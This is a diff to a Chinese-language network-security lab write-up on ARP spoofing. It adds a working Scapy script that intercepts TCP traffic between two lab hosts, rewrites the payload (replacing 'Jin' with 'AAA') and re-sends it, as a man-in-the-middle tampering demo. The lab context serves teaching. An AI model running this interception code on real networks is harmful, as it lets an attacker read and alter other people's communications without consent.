@@ -241,6 +241,35 @@ pkt = sniff(filter = f, prn = spoof_pkt)
 同理，我们修改上面的代码：
 
 ```python title="ARP_Attack.py"
+from scapy.all import *
+
+IP_A = "10.9.0.5"
+MAC_A = "ea:9c:17:47:e2:9e"
+IP_B = "10.9.0.6"
+MAC_B = "16:4c:eb:48:1a:7d"
+
+def spoof_pkt(pkt):
+	if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+		newpkt = IP(bytes(pkt[IP]))
+		del(newpkt.chksum)
+		del(newpkt[TCP].payload)
+		del(newpkt[TCP].chksum)
+
+		if pkt[TCP].payload:
+			data = pkt[TCP].payload.load
+			newdata = data.replace(b'Jin', b'AAA')
+			print(str(data) + " -> " + str(newdata))
+			send(newpkt / newdata, verbose = False)
+		else:
+			send(newpkt, verbose = False)
+	elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+		newpkt = IP(bytes(pkt[IP]))
+		del(newpkt.chksum)
+		del(newpkt[TCP].chksum)
+		send(newpkt, verbose = False)
+
+f = 'tcp and (ether src ea:9c:17:47:e2:9e or ether src 16:4c:eb:48:1a:7d)'
+pkt = sniff(filter = f, prn = spoof_pkt)
 ```
 
 关闭 M 的 IP 转发，运行代码，在 A 中输入带姓氏 `Jin` 的部分都回被替换成 `AAA`：
